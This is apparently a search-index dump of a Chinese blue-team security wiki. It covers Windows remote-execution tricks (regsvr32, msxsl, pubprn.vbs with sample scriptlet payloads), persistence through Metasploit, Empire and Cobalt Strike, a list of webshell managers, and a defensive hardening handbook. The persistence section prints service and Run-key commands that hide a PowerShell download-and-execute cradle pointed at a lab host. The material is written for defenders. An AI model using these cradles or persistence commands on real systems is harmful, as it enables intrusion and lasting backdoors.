Regsvr32\u547d\u4ee4\u7528\u4e8e\u6ce8\u518cCOM\u7ec4\u4ef6\uff0c\u662fWindows\u7cfb\u7edf\u63d0\u4f9b\u7684\u7528\u6765\u5411\u7cfb\u7edf\u6ce8\u518c\u63a7\u4ef6\u6216\u8005\u5378\u8f7d\u63a7\u4ef6\u7684\u547d\u4ee4\uff0c\u4ee5\u547d\u4ee4\u884c\u65b9\u5f0f\u8fd0\u884c \u5728\u76ee\u6807\u673a\u4e0a\u6267\u884c\uff1a regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll \u53ef\u4ee5\u901a\u8fc7\u81ea\u5df1\u6784\u9020.sct\u6587\u4ef6\uff0c\u53bb\u4e0b\u8f7d\u6267\u884c\u6211\u4eec\u7684\u7a0b\u5e8f <?XML version=\"1.0\"?> <scriptlet> <registration progid=\"ShortJSRAT\" classid=\"{10001111-0000-0000-0000-0000FEEDACDC}\" > <script language=\"JScript\"> <![CDATA[ ps = \"cmd.exe /c calc.exe\"; new ActiveXObject(\"WScript.Shell\").Run(ps,0,true); ]]> </script> </registration> </scriptlet> \u6267\u884c\u547d\u4ee4\uff0c\u6210\u529f\u5f39\u8ba1\u7b97\u5668\uff1a 14\u3001MSXSL.EXE msxsl.exe\u662f\u5fae\u8f6f\u7528\u4e8e\u547d\u4ee4\u884c\u4e0b\u5904\u7406XSL\u7684\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6240\u4ee5\u901a\u8fc7\u4ed6\uff0c\u6211\u4eec\u53ef\u4ee5\u6267\u884cJavaScript\u8fdb\u800c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002 \u4e0b\u8f7d\u5730\u5740\u4e3a\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=21714 msxsl.exe \u9700\u8981\u63a5\u53d7\u4e24\u4e2a\u6587\u4ef6\uff0cXML\u53caXSL\u6587\u4ef6\uff0c\u53ef\u4ee5\u8fdc\u7a0b\u52a0\u8f7d\uff0c\u5177\u4f53\u65b9\u5f0f\u5982\u4e0b\uff1a msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl demo.xml <?xml version=\"1.0\"?> <?xml-stylesheet type=\"text/xsl\" href=\"exec.xsl\" ?> <customers> <customer> <name>Microsoft</name> </customer> </customers> exec.xsl <?xml version='1.0'?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"http://mycompany.com/mynamespace\"> <msxsl:script language=\"JScript\" implements-prefix=\"user\"> function xml(nodelist) { var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /c calc.exe\"); return nodelist.nextNode().xml; } </msxsl:script> <xsl:template match=\"/\"> <xsl:value-of select=\"user:xml(.)\"/> </xsl:template> </xsl:stylesheet> 15\u3001pubprn.vbs \u5728Windows 7\u4ee5\u4e0a\u7248\u672c\u5b58\u5728\u4e00\u4e2a\u540d\u4e3aPubPrn.vbs\u7684\u5fae\u8f6f\u5df2\u7b7e\u540dWSH\u811a\u672c\uff0c\u5176\u4f4d\u4e8eC:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\uff0c\u4ed4\u7ec6\u89c2\u5bdf\u8be5\u811a\u672c\u53ef\u4ee5\u53d1\u73b0\u5176\u663e\u7136\u662f\u7531\u7528\u6237\u63d0\u4f9b\u8f93\u5165\uff08\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570\uff09\uff0c\u4e4b\u540e\u518d\u5c06\u53c2\u6570\u4f20\u9012\u7ed9GetObject() \"C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs\" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct test.sct <?XML version=\"1.0\"?> <scriptlet> <registration description=\"Bandit\" progid=\"Bandit\" version=\"1.00\" classid=\"{AAAA1111-0000-0000-0000-0000FEEDACDC}\" remotable=\"true\" > </registration> <script language=\"JScript\"> <![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"); ]]> </script> </scriptlet> \u53c2\u8003\u6587\u7ae0\uff1a https://xz.aliyun.com/t/1654/ https://evi1cg.me/archives/remote_exec.html \u6536\u96c6\u6574\u7406\u768415\u79cd\u6587\u4ef6\u4e0b\u8f7d\u7684\u65b9\u5f0f https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A Windows\u6267\u884c\u547d\u4ee4\u4e0e\u4e0b\u8f7d\u6587\u4ef6\u603b\u7ed3 https://www.cnblogs.com/17bdw/p/8550189.html \u5728windows\u4e0a\u6267\u884c\u6076\u610f\u4ee3\u7801 by rundll32 & regsvr32 https://www.jianshu.com/p/e8f65deac245 IEexec.exe\u6267\u884cpayload https://www.codercto.com/a/104908.html rundll32.exe \u591a\u79cd\u65b9\u6cd5\u7ed5\u8fc7\u767d\u540d\u5355 https://www.cnblogs.com/backlion/p/10488747.html","title":"\u7b2c5\u7bc7\uff1aWindows\u547d\u4ee4\u884c\u6587\u4ef6\u4e0b\u8f7d\u65b9\u5f0f\u6c47\u603b"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#6","text":"","title":"\u7b2c6\u7bc7\uff1a\u4e09\u5927\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u6743\u9650\u7ef4\u6301\u6280\u672f"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x00_2","text":"\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u6709\u4e09\u4e2a\u975e\u5e38\u7ecf\u5178\u7684\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6----Metasploit\u3001Empire\u3001Cobalt Strike\u3002 \u90a3\u4e48\uff0c\u901a\u8fc7\u6f0f\u6d1e\u83b7\u53d6\u5230\u76ee\u6807\u4e3b\u673a\u6743\u9650\u540e\uff0c\u5982\u4f55\u5229\u7528\u6846\u67b6\u83b7\u5f97\u6301\u4e45\u6027\u6743\u9650\u5462\uff1f","title":"0x00 \u524d\u8a00"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x01-msf","text":"\u4f7f\u7528MSF\u7ef4\u6301\u6743\u9650\u7684\u524d\u63d0\u662f\u5148\u83b7\u5f97\u4e00\u4e2a*meterpreter* shell\uff0c\u901a\u8fc7*meterpreter* shell\u83b7\u53d6\u6301\u4e45\u6027shell\u7684\u65b9\u6cd5\u6709\u4e24\u79cd\uff1a Persistence\u6a21\u5757 \u901a\u8fc7\u542f\u52a8\u9879\u542f\u52a8(persistence)\u7684\u65b9\u5f0f\uff0c\u5728\u76ee\u6807\u673a\u5668\u4e0a\u4ee5\u53cd\u5f39\u56de\u8fde\u3002 -U\uff1a\u8bbe\u7f6e\u540e\u95e8\u5728\u7528\u6237\u767b\u5f55\u540e\u81ea\u542f\u52a8\u3002\u8be5\u65b9\u5f0f\u4f1a\u5728HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u4e0b\u6dfb\u52a0\u6ce8\u518c\u8868\u4fe1\u606f\u3002\u63a8\u8350\u4f7f\u7528\u8be5\u53c2\u6570\uff1b -X\uff1a\u8bbe\u7f6e\u540e\u95e8\u5728\u7cfb\u7edf\u542f\u52a8\u540e\u81ea\u542f\u52a8\u3002\u8be5\u65b9\u5f0f\u4f1a\u5728HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u4e0b\u6dfb\u52a0\u6ce8\u518c\u8868\u4fe1\u606f\u3002\u7531\u4e8e\u6743\u9650\u95ee\u9898\uff0c\u4f1a\u5bfc\u81f4\u6dfb\u52a0\u5931\u8d25\uff0c\u540e\u95e8\u5c06\u65e0\u6cd5\u542f\u52a8\u3002 -S\uff1a\u4f5c\u4e3a\u670d\u52a1\u81ea\u52a8\u542f\u52a8\u4ee3\u7406\u7a0b\u5e8f\uff08\u5177\u6709SYSTEM\u6743\u9650\uff09 \u751f\u6210\u7684\u76f8\u5173\u6587\u4ef6\u4f4d\u7f6e \uff1a # \u540e\u95e8\u6587\u4ef6\u4f4d\u7f6e\uff1a C:\\Windows\\Temp C:\\Users\\Administrator\\AppData\\Local\\Temp # \u6ce8\u518c\u8868\u4f4d\u7f6e\uff1a HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ Metsvc \u6a21\u5757 \u901a\u8fc7\u670d\u52a1(metsvc)\u542f\u52a8\u7684\u65b9\u5f0f\uff0c\u5728\u76ee\u6807\u673a\u5668\u542f\u52a8\u540e\u81ea\u542f\u52a8\u4e00\u4e2a\u670d\u52a1\uff0c\u7b49\u5f85\u8fde\u63a5\u3002 \u540e\u95e8\u6392\u67e5\uff1a\u76ee\u6807\u4e3b\u673a\u4e0a\u5f00\u542f\u4e86\u4e00\u4e2aMeterpreter\u670d\u52a1\u3002","title":"0x01 MSF\u6743\u9650\u7ef4\u6301"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x02-empire","text":"Empire\u7684persistence\u6a21\u5757\u63d0\u4f9b\u4e8618\u79cd\u6743\u9650\u7ef4\u6301\u7684\u65b9\u6cd5\uff0c\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u56db\u7c7b\uff0c\u5373 elevated\uff08\u7ba1\u7406\u6743\u9650\uff09 misc\uff08\u6742\u9879\uff09 powerbreach userland\uff08\u7528\u6237\u6743\u9650\uff09 registry* add_netuser deaduser backdoor_lnk schtasks* add_sid_history* eventlog* registry wmi* debugger* resolver schtasks wmi_updater* disable_machine_acct_change* get_ssps install_ssp* memssp* skeleton_key* \u6ce8\u518c\u8868 (Empire: agents) > agents (Empire: agents) > interact URL3FZBV (Empire: URL3FZBV) > usemodule persistence/elevated/registry* (Empire: powershell/persistence/elevated/registry) > set Listener test (Empire: powershell/persistence/elevated/registry) > execute \u56e0\u4e3a\u662f\u5f00\u673a\u542f\u52a8\uff0c\u6240\u4ee5\u4f1a\u5f39\u4e2a\u9ed1\u6846\uff0c\u4e4b\u540e\u8fd8\u4f1a\u5f39\u51fa\u6ce8\u518c\u8868\u6dfb\u52a0\u7684powershell\u542f\u52a8\u9879\u7684\u6846\uff0c\u5728\u6ce8\u518c\u8868\u4f4d\u7f6e\u5982\u4e0b\uff1a \u8ba1\u5212\u4efb\u52a1 (Empire: agents) > interact 9NZ2RWBC (Empire: 9NZ2RWBC) > usemodule persistence/elevated/schtasks* (Empire: powershell/persistence/elevated/schtasks) > set Listener test (Empire: powershell/persistence/elevated/schtasks) > set DailyTime 22:50 (Empire: powershell/persistence/elevated/schtasks) > execute \u5728\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\u5e93\u53ef\u4ee5\u770b\u5230-\u4efb\u52a1\u4e3aUpdater-\u542f\u52a8\u7a0b\u5e8f\u5982\u4e0b\u53ef\u4ee5\u5230\u4e3apowershell wmi (Empire: agents) > interact 9NZ2RWBC (Empire: 9NZ2RWBC) > usemodule persistence/elevated/wmi (Empire: powershell/persistence/elevated/wmi) > set Listener test (Empire: powershell/persistence/elevated/wmi) > run \u5982\u4f55\u6e05\u9664\u540e\u95e8\uff0c\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528Autoruns\uff0c\u9009\u62e9WMI\u9009\u9879\u5361\uff0c\u53f3\u952e\u5c31\u53ef\u4ee5\u5220\u9664\u6076\u610f\u540e\u95e8\u3002","title":"0x02 Empire \u6743\u9650\u7ef4\u6301"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x03-cobalt-strike","text":"\u901a\u8fc7Cobalt Strike\u62ff\u5230\u4e00\u4e2ashell\uff0c\u7559\u540e\u95e8\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4e0b\u9762\u4ecb\u7ecd\u4e24\u79cd\u6bd4\u8f83\u5e38\u89c1\u7684\u65e0\u6587\u4ef6\u3001\u81ea\u542f\u52a8\u540e\u95e8\u3002 \u4eceCobalt Strike\u83dc\u5355\u680f\uff0cAttacks--Web Drive-by--Scaripted Web Delivery\uff0c\u751f\u6210powershell\u540e\u95e8\u3002 \u6839\u636e\u9700\u8981\u53ef\u4ee5\u81ea\u5df1\u9009\u62e9\uff0c\u586b\u5199\u6240\u9700\u53c2\u6570\u9ed8\u8ba4\u7aef\u53e3\u662f80\uff08\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u4e0d\u8981\u4f7f\u7528\u91cd\u590d\u7aef\u53e3\uff09\uff0cType\u9009\u62e9powershell\u3002 \u70b9\u51fbLaunch\u540e\uff0c\u8fd4\u56depowershell\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c\u547d\u4ee4\u3002 \u670d\u52a1\u81ea\u542f\u52a8\u540e\u95e8 sc create \"Name\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" sc description Name \"Just For Test\" //\u8bbe\u7f6e\u670d\u52a1\u7684\u63cf\u8ff0\u5b57\u7b26\u4e32 sc config Name start= auto //\u8bbe\u7f6e\u8fd9\u4e2a\u670d\u52a1\u4e3a\u81ea\u52a8\u542f\u52a8 net start Name //\u542f\u52a8\u670d\u52a1 \u91cd\u542f\u670d\u52a1\u5668\u540e\uff0c\u6210\u529f\u8fd4\u56de\u4e00\u4e2ashell\u3002 \u6ce8\u518c\u8868\u81ea\u542f\u52a8 \u5728windows\u542f\u52a8\u9879\u6ce8\u518c\u8868\u91cc\u9762\u6dfb\u52a0\u4e00\u4e2a\u6728\u9a6c\u7a0b\u5e8f\u8def\u5f84\uff0c\u5982\uff1a beacon>getsystem beacon>shell reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Keyname\" /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" /f \u8d26\u53f7\u6ce8\u9500\u540e\uff0c\u91cd\u65b0\u767b\u5f55\uff0c\u754c\u9762\u4e0a\u4f1a\u51fa\u73b0powershell\u5feb\u901f\u95ea\u8fc7\u6d88\u5931\uff0c\u6210\u529f\u8fd4\u56deshell\u3002 \u6ce8\u518c\u8868\u8fd8\u6709\u54ea\u4e9b\u952e\u503c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u81ea\u542f\u52a8\uff1a HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","title":"0x03 Cobalt Strike\u6743\u9650\u7ef4\u6301"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x04_2","text":"\u672c\u6587\u7b80\u5355\u4ecb\u7ecd\u4e86\u901a\u8fc7\u4e09\u5927\u6e17\u900f\u6846\u67b6\u8fdb\u884c\u6743\u9650\u7ef4\u6301\u7684\u51e0\u79cd\u65b9\u6cd5\uff0c\u4e86\u89e3\u653b\u51fb\u8005\u5e38\u7528\u7684\u6e17\u900f\u6846\u67b6\u53ca\u540e\u95e8\u6280\u672f\uff0c\u6709\u52a9\u4e8e\u66f4\u597d\u5730\u53bb\u53d1\u73b0\u5e76\u89e3\u51b3\u670d\u52a1\u5668\u5b89\u5168\u95ee\u9898\u3002","title":"0x04 \u7ed3\u675f\u8bed"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#7webshell","text":"\u653b\u51fb\u8005\u5728\u5165\u4fb5\u7f51\u7ad9\u65f6\uff0c\u901a\u5e38\u8981\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u5199\u5165Webshell\uff0c\u4ece\u800c\u83b7\u5f97\u670d\u52a1\u5668\u7684\u63a7\u5236\u6743\u9650\uff0c\u6bd4\u5982\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3001\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u3001\u7a83\u53d6\u7528\u6237\u6570\u636e\uff0c\u7be1\u6539\u7f51\u7ad9\u9875\u9762\u7b49\u64cd\u4f5c\u3002 \u672c\u6587\u4ecb\u7ecd\u5341\u6b3e\u5e38\u7528\u7684Webshell\u7ba1\u7406\u5de5\u5177\uff0c\u4ee5\u4f9b\u4f60\u9009\u62e9\uff0c\u4f60\u4f1a\u9009\u62e9\u54ea\u4e00\u4e2a\uff1f 1\u3001\u4e2d\u56fd\u83dc\u5200(Chopper) \u4e2d\u56fd\u83dc\u5200\u662f\u4e00\u6b3e\u4e13\u4e1a\u7684\u7f51\u7ad9\u7ba1\u7406\u8f6f\u4ef6\uff0c\u7528\u9014\u5e7f\u6cdb\uff0c\u4f7f\u7528\u65b9\u4fbf\uff0c\u5c0f\u5de7\u5b9e\u7528\u3002\u53ea\u8981\u652f\u6301\u52a8\u6001\u811a\u672c\u7684\u7f51\u7ad9\uff0c\u90fd\u53ef\u4ee5\u7528\u4e2d\u56fd\u83dc\u5200\u6765\u8fdb\u884c\u7ba1\u7406\uff01\u5728\u975e\u7b80\u4f53\u4e2d\u6587\u73af\u5883\u4e0b\u4f7f\u7528\uff0c\u81ea\u52a8\u5207\u6362\u5230\u82f1\u6587\u754c\u9762\u3002UNICODE\u65b9\u5f0f\u7f16\u8bd1\uff0c\u652f\u6301\u591a\u56fd\u8bed\u8a00\u8f93\u5165\u663e\u793a\u3002 2\u3001\u8681\u5251(AntSword) AntSword\u662f\u4e00\u4e2a\u5f00\u653e\u6e90\u4ee3\u7801\uff0c\u8de8\u5e73\u53f0\u7684\u7f51\u7ad9\u7ba1\u7406\u5de5\u5177\uff0c\u65e8\u5728\u6ee1\u8db3\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u4ee5\u53ca\u5177\u6709\u6743\u9650\u548c/\u6216\u6388\u6743\u7684\u5b89\u5168\u7814\u7a76\u4eba\u5458\u4ee5\u53ca\u7f51\u7ad9\u7ba1\u7406\u5458\u7684\u9700\u6c42\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/AntSwordProject/antSword 3\u3001C\u5200(Cknife) \u8fd9\u662f\u4e00\u6b3e\u8de8\u5e73\u53f0\u7684\u57fa\u4e8e\u914d\u7f6e\u6587\u4ef6\u7684\u4e2d\u56fd\u83dc\u5200\uff0c\u628a\u6240\u6709\u64cd\u4f5c\u7ed9\u4e88\u7528\u6237\u6765\u5b9a\u4e49\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/Chora10/Cknife 4\u3001\u51b0\u874e(Behinder) \u51b0\u874e\u201d\u662f\u4e00\u6b3e\u52a8\u6001\u4e8c\u8fdb\u5236\u52a0\u5bc6\u7f51\u7ad9\u7ba1\u7406\u5ba2\u6237\u7aef\u3002 github\u5730\u5740\uff1a https://github.com/rebeyond/Behinder 5\u3001Xise XISE WebShell\u7ba1\u7406\u5de5\u5177\u3002 6\u3001Altman Altman3\u662f\u4e00\u6b3e\u6e17\u900f\u6d4b\u8bd5\u8f6f\u4ef6\uff0c\u57fa\u4e8e.Net4.0\u5f00\u53d1\uff0c\u4f9d\u6258Eto.Form\u53ef\u4ee5\u5b8c\u7f8e\u8fd0\u884c\u5728Windows\u3001Linux\u3001Mac\u7b49\u591a\u4e2a\u5e73\u53f0\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/keepwn/Altman 7\u3001Weevely Weevely\u662f\u4e00\u79cdPython\u7f16\u5199\u7684webshell\u7ba1\u7406\u5de5\u5177\uff0c\u8de8\u5e73\u53f0\uff0c\u53ea\u652f\u6301PHP\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/epinna/weevely3 \u7528\u6cd5\u793a\u4f8b\uff1a weevely generate <password> <path> weevely <URL> <password> [cmd] \u540c\u65f6\uff0c\u5728Kali 2.0 \u7248\u672c\u4e0b\uff0c\u96c6\u6210\u4e86\u4e09\u6b3eWeb\u540e\u95e8\u5de5\u5177\uff1aWebaCoo\u3001weevely\u3001PHP Meterpreter\u3002 8\u3001QuasiBot QuasiBot\u662f\u4e00\u6b3ephp\u7f16\u5199\u7684webshell\u7ba1\u7406\u5de5\u5177\uff0c\u53ef\u4ee5\u5bf9webshell\u8fdb\u884c\u8fdc\u7a0b\u6279\u91cf\u7ba1\u7406\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/Smaash/quasibot 9\u3001Webshell-Sniper \u8fd9\u662f\u4e00\u6b3e\u57fa\u4e8e\u7ec8\u7aef\u7684webshell\u7ba1\u7406\u5de5\u5177\uff0c\u4ec5\u652f\u6301\u5728\u7c7bUnix\u7cfb\u7edf\u4e0a\u8fd0\u884c\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/WangYihang/Webshell-Sniper \u7528\u6cd5\u793a\u4f8b\uff1a Usage : python webshell-sniper.py [URL] [METHOD] [AUTH] Example : python webshell-sniper.py http://127.0.0.1/c.php POST c 10\u3001WebshellManager \u4e00\u6b3e\u7528PHP+Mysql\u5199\u7684\u4e00\u53e5\u8bddWEB\u7aef\u7ba1\u7406\u5de5\u5177\uff0c\u76ee\u524d\u4ec5\u652f\u6301\u5bf9PHP\u7684\u4e00\u53e5\u8bdd\u8fdb\u884c\u64cd\u4f5c\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/boy-hack/WebshellManager","title":"\u7b2c7\u7bc7\uff1a\u5e38\u89c1WebShell\u7ba1\u7406\u5de5\u5177"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E6%89%8B%E5%86%8C/","text":"0. ) \u51c6\u5907\u5de5\u4f5c \u00b6 1 ) \u7ec4\u7ec7\u7ed3\u6784\u56fe 2 ) \u5168\u7f51\u62d3\u6251\u56fe 3 ) \u5404\u7cfb\u7edf\u903b\u8f91\u7ed3\u6784\u56fe 4 ) \u5404\u7cfb\u7edf\u4e4b\u95f4\u7684\u8c03\u7528\u5173\u7cfb 5 ) \u6570\u636e\u6d41\u5173\u7cfb 6 ) \u6838\u5fc3\u8d44\u4ea7\u6e05\u5355 7 ) \u5e94\u6025\u54cd\u5e94\u8ba1\u5212 8 ) \u4e1a\u52a1\u8fde\u7eed\u6027\u8ba1\u5212 9 ) \u707e\u96be\u6062\u590d\u8ba1\u5212 1. ) \u7b80\u5355\u5b89\u5168\u8bc4\u4f30 \u00b6 1.1 ) \u7aef\u53e3\u626b\u63cf\u548c\u6f0f\u6d1e\u68c0\u6d4b \u4e3b\u673a\u53d1\u73b0\uff08Ping\u63a2\u6d4b\uff09\uff1a # nmap -sn -PE IP\u5730\u5740\u6216\u5730\u5740\u6bb5 \u7aef\u53e3\u626b\u63cf\uff1a # nmap \u2013open IP\u5730\u5740\u6216\u5730\u5740\u6bb5 \u670d\u52a1\u7248\u672c\u68c0\u6d4b\uff1a # nmap -sV IP\u5730\u5740\u6216\u5730\u5740\u6bb5 \u626b\u63cf\u591a\u4e2a\u7aef\u53e3\uff1a # nmap -p 80,443 IP\u5730\u5740\u6216\u5730\u5740\u6bb5 UDP\u7aef\u53e3\u626b\u63cf\uff1a # nmap -sU -p 53 IP\u5730\u5740\u6216\u5730\u5740\u6bb5 TCP/UDP\u7aef\u53e3\u626b\u63cf\uff08-Pn \u8df3\u8fc7\u4e3b\u673a\u53d1\u73b0\uff09\uff1a # nmap -v -Pn -SU -ST -p U:53,111,137,T:21- 25,80,139,8080 IP\u5730\u5740\u6216\u5730\u5740\u6bb5 Nessus\u6f0f\u6d1e\u68c0\u6d4b\uff1a # nessus -q -x -T html \u670d\u52a1\u5668IP \u670d\u52a1\u5668\u7aef\u53e3 \u7ba1\u7406\u5458\u5e10\u53f7 \u5bc6\u7801 \u76ee\u6807.txt \u8f93\u51fa\u62a5\u544a.html OPENVAS\u6f0f\u6d1e\u68c0\u6d4b\uff1a # apt -y install pcregrep # wget https://goo.gl/TYbLwE # chmod +x openvas-automate.sh && ./openvas-automate.sh \u76ee\u6807IP 1.2 ) WINDOWS\u7cfb\u7edf\u7bc7 1.2.1 \u7f51\u7edc\u53d1\u73b0 \u57fa\u672c\u7f51\u7edc\u53d1\u73b0 # C:> net view /all # C:> net view \\\u4e3b\u673a\u540d Ping\u63a2\u6d4b # C:> for /L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find \u201c\u56de\u590d\u201d >> \u8f93\u51fa.txt 1.2.2 DHCP \u542f\u7528DHCP\u670d\u52a1\u5668\u65e5\u5fd7\u529f\u80fd\uff1a # C:> reg add HKLM\\System\\CurrentControlSet\\Services\\DhcpServer\\Parameters /v ActivityLogFlag /t REG_DWORD /d 1 \u9ed8\u8ba4\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84\uff1a C:> %windir%\\System32\\Dhcp 1.2.3 DNS \u542f\u7528DNS\u670d\u52a1\u5668\u65e5\u5fd7\u529f\u80fd\uff1a # C:> DNSCmd DNS\u670d\u52a1\u5668\u540d /config /logLevel 0x8100F331 # \u914d\u7f6e\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84: C:> DNSCmd DNS\u670d\u52a1\u5668\u540d /config /LogFilePath C:\\dns.log # \u914d\u7f6e\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f: C:> DNSCmd DNS\u670d\u52a1\u5668\u540d /config /logfilemaxsize 0xffffffff 1.2.4 \u54c8\u5e0c\u503c \u6587\u4ef6\u6821\u9a8c\u548c\u5b8c\u6574\u6027\u9a8c\u8bc1\uff08FCIV\uff09\uff1a Ref\uff1a http://support2.microsoft.com/kb/841290 # \u8ba1\u7b97\u5355\u4e2a\u6587\u4ef6hash\u503c: C:> fciv.exe \u6587\u4ef6\u540d # \u8ba1\u7b97C\u76d8\u6240\u6709\u6587\u4ef6\u7684\u54c8\u5e02\u503c\u5e76\u628a\u7ed3\u679c\u4fdd\u5b58\u5230\u6587\u4ef6\u4e2d: C:> fciv.exe c: -r -sha1 -xml \u7ed3\u679c.xml # \u5217\u51fa\u6240\u6709hash\u503c: C:> fciv.exe -list -sha1 -xml \u7ed3\u679c.xml # certutil & PowerShell\u65b9\u6cd5 # certutil -hashfile \u6587\u4ef6\u540d SHA1 # PS C:> Get-FileHash \u6587\u4ef6\u540d | Format-List # PS C:> Get-FileHash -algorithm md5 \u6587\u4ef6\u540d 1.2.5 NETBIOS nbtstat \u626b\u63cf # C:> nbtstat -A \u76ee\u6807IP\u5730\u5740 NetBIOS\u7f13\u5b58 # C:> nbtstat -c \u6279\u91cf\u626b\u63cf # C:> for /L %I in (1,1,254) do nbtstat -An 192.168.1.%I 1.2.6 \u5fae\u8f6f\u57fa\u7ebf\u5b89\u5168\u5206\u6790\u5668(MBSA) \u626b\u63cf\u5355\u4e2aIP # C:> mbsacli.exe /target IP\u5730\u5740 /n os+iis+sql+password \u626b\u63cfIP\u5730\u5740\u6bb5 # C:> mbsacli.exe /r IP\u5730\u5740\u6bb5 /n os+iis+sql+password 1.3 ) LINUX\u7cfb\u7edf\u7bc7 1.3.1 \u7f51\u7edc\u53d1\u73b0 \u67e5\u770b\u5f00\u653e\u7684SMB\u5171\u4eab # smbclient -L \u76ee\u6807\u4e3b\u673a\u540d Ping\u63a2\u6d4b \\# for ip in $(seq 1 254); do ping -c1 -w2 192.168.1.$ip>/dev/null; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done 1.3.2 DHCP DHCP\u65e5\u5fd7\u67e5\u8be2 RHEL/CentOS # cat /var/lib/dhcpd/dhcpd. leases Debian/Ubuntu # grep -Ei \u2018dhcp\u2019 /var/log/syslog.1 1.3.3 DNS DNS\u65e5\u5fd7\u67e5\u8be2 # rndc querylog && tail -f /var/log/messages | grep named 1.3.4 \u54c8\u5e0c\u503c \u8ba1\u7b97/sbin\u76ee\u5f55\u4e0b\u6240\u6709\u53ef\u6267\u884c\u6587\u4ef6\u7684HASH\u503c # find /sbin -type f -exec md5sum {} >> md5sums.txt \\; # md5deep -rs /sbin > md5sums.txt 1.3.5 NETBIOS nbtstat \u626b\u63cf # nbtscan \u76ee\u6807IP\u5730\u5740\u6216IP\u5730\u5740\u6bb5 \u4e3e\u4f8b\uff1anbtscan 192.168.1.2-100 2. ) \u5b89\u5168\u52a0\u56fa \u00b6 2.1 ) WINDOWS\u7cfb\u7edf\u7bc7 2.1.1 \u7981\u7528/\u505c\u6b62\u670d\u52a1 # C:> sc query # C:> sc config \u201c\u670d\u52a1\u540d\u201d start= disabled # C:> sc stop \u201c\u670d\u52a1\u540d\u201d # C:> wmic service where name=\u201d\u670d\u52a1\u540d\u201d call ChangeStartmode Disabled 2.1.2 \u9632\u706b\u5899\u7ba1\u7406 # \u5217\u51fa\u6240\u6709\u89c4\u5219: # C:> netsh advfirewall firewall show rule name=all # \u542f\u7528\u6216\u7981\u7528\u9632\u706b\u5899: C:> netsh advfirewall set currentprofile state on C:> netsh advfirewall set currentprofile firewallpolicy blockinboundalways,allowoutbound C:> netsh advfirewall set publicprofile state on C:> netsh advfirewall set privateprofile state on C:> netsh advfirewall set domainprofile state on C:> netsh advfirewall set allprofile state on C:> netsh advfirewall set allprof ile state off # \u914d\u7f6e\u4e3e\u4f8b\uff1a netsh advfirewall firewall add rule name=\"\u5f00\u653eTCP:80\u7aef\u53e3\" dir=in action=allow protocol=TCP localport=80 netsh advfirewall firewall add rule 